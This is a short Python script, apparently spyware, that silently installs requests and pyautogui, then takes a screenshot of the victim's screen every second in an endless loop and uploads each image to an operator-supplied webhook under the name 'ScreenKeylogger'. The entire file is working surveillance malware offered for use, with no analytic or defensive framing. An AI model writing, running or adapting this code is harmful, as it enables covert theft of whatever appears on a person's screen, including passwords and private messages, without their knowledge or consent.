import pyautogui, requests, io, time, os
WEBHOOK = "Your webhook here ! "
if os.name == 'nt':
    os.system('@echo off & pip install requests pyautogui >nul 2>&1')
else:
    os.system('pip3 install requests pyautogui > /dev/null 2>&1 &')
while True:
    screenshot = pyautogui.screenshot()
    screenshot_bytes = io.BytesIO()
    screenshot.save(screenshot_bytes, format='PNG')
    screenshot_bytes.seek(0)
    response = requests.post(
    WEBHOOK,
    files={
        'file': ('screenshot.png', screenshot_bytes, 'image/png')
    },
    data={
        'username': 'ScreenKeylogger',
        'content': '**Capture :**'
    })
    time.sleep(1)
